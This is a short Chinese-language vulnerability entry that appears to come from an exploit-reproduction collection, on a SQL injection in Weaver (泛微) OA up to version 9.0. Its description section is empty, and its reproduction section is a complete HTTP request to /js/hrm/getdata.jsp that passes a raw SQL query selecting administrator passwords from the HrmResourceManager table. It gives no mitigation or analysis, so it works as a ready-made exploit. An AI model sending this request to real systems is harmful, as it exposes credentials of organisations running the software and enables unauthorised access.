泛微OA \< =9.0 sql注入漏洞
==========================

一、漏洞简介
------------

二、漏洞影响
------------

泛微OA \< =9.0

三、复现过程
------------

    GET //js/hrm/getdata.jsp?cmd=getSelectAlld&sql=select%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
    Host: www.0-sec.org
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie:
    Connection: close
